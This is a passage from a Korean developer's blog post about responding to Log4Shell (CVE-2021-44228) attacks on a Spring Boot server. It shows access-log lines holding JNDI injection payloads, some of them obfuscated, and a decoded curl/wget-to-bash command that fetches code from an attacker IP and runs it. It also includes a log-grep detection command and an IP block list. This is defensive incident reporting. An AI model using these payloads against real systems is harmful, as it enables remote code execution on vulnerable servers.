\"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzMuMzYuMTU5LjIwNDo0NDMpfGJhc2g=}\"\n\n====\n\nfuck-hack@ip-999-444-999-444:~$ sudo find /var/log/ -type f -exec sh -c \"cat {} | sed -e 's/\\${lower://'g | tr -d '}' | egrep -I -i 'jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):'\" \\;\n51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] \"GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0\" 404 162 \"-\" \"mozila\"\n45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1\" 404 134 \"${jndi:dns://45.83.64.1/securityscan-http80\" \"${jndi:dns://45.83.64.1/securityscan-http80\"\n45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1\" 302 0 \"${jndi:dns://45.83.64.1/securityscan-https443\" \"${jndi:dns://45.83.64.1/securityscan-https443\"\n45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET / HTTP/1.1\" 200 7587 \"${jndi:dns://45.83.64.1/securityscan-https443\" \"${jndi:dns://45.83.64.1/securityscan-https443\"\n195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo HTTP/1.1\" 200 396 \"${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo\" \"${${::-j${::-n${::-d${::-i:${::-l${::-d${::-a${::-p://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo\"\n167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] \"GET / HTTP/1.0\" 200 612 \"-\" \"borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClas</code></pre></div>\n<p>저기서 base64로 인코딩된 부분을 풀어보니</p>\n<blockquote>\n<p>(curl -s 195.54.160.149:5874/3.36.159.204:80||wget -q -O- 195.54.160.149:5874/3.36.159.204:80)|bash</p>\n</blockquote>\n<p>참고 url 중에 차단 권고에 나온 시도가 많았다.<br>\n조기에 발견해서 다행인거 같고…정말 침입시도가 무수했다…<br>\n모두 대응 처리를 해뒀다.</p>\n<br>\n<h3 id=\"부록---래브라도\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EB%A1%9D---%EB%9E%98%EB%B8%8C%EB%9D%BC%EB%8F%84\" aria-label=\"부록   래브라도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>부록 - 래브라도</h3>\n<p><a href=\"https://labrador.iotcube.com\">래브라도</a> 에서 log4j 취약점 점검 도구를 제공하고 있다.<br>\n그런데 난 사용해도 이상하게 검출이 안되었다;;</p>\n<p>사용법은 저기 나와있겠지만…<br>\n프로젝트 디렉토리를 난 해당 프로젝트의 root 디렉토리로 잡아보고, jar 파일만 있는 곳에서도 해봤는데 검출 결과가 0이었다.<br>\n그 때 2.11 사용했었는데…<br>\n아마 user agent를 다른 방식으로 기록해서 그런가…<br>\n무튼 정 찝찝하면 한번 돌려보는 것도 좋은 방법일듯…</p>\n<br>\n<h3 id=\"부록---ip-처리\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EB%A1%9D---ip-%EC%B2%98%EB%A6%AC\" aria-label=\"부록   ip 처리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>부록 - IP 처리</h3>\n<p>LG CNS와 talos 글에 나온 ip를 차단하였다.<br>\n난 저 아이피에 class 대역 차단으로 더 막아뒀다.</p>\n<p>171.25.193.0/24<br>\n185.220.0.0/16</p>\n<p>이 두놈이 좀 많았다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">109.237.96.124 1; #log4j attacker\n        185.100.87.202 1;\n        213.164.204.146 1;\n        185.220.101.146 1;\n        171.25.193.20 1;\n        178.17.171.102 1;\n        45.155.205.233 1;\n        171.25.193.25 1;\n        171.25.193.77 1;\n        171.25.193.78 1;\n        182.220.100.242 1;\n        185.220.101.39 1;\n        18.27.197.252 1;\n        89.234.182.139 1;\n        104.244.79.6 1;\n        80.71.158.12 1;\n        45.137.155.55 1;\n        89.249.63.3 1;\n        61.19.25.207 1;\n        195.251.41.139 1;\n        131.100.148.7 1;\n        46.105.95.220 1;\n        170.210.45.163 1;\n        5.157.38.50 1;\n        114.112.161.155 1;\n        221.228.87.37 1;\n        191.232.38.25 1;\n        164.52.53.163 1;\n        45.130.229.168 1;\n        133.130.120.176 1;\n        152.89.239.12 1;\n        163.172.157.143 1;\n        205.185.115.217 1; #log4 attacker</code></pre></div>","frontmatter":{"title":"Spring boot log4j 취약점 처리 후기 (CVE-2021-44228)","date":"December 14, 2021"}}},"pageContext":{"slug":"/spring_spring-boot/211214_springboot-log4j-hack/","previous":{"fields":{"slug":"/til/211207_devnote/"},"frontmatter":{"title":"21년 12월 7일 연구일지 (with SML (Save My Link) 그냥 즐겨찾기 프로그램 만든 후기)"}},"next":{"fields":{"slug":"/my_project/211229_introduce-sml/"},"frontmatter":{"title":"즐겨찾기 관리 프로그램 SML 배포"}}}},"staticQueryHashes":["3128451518","903436796"]}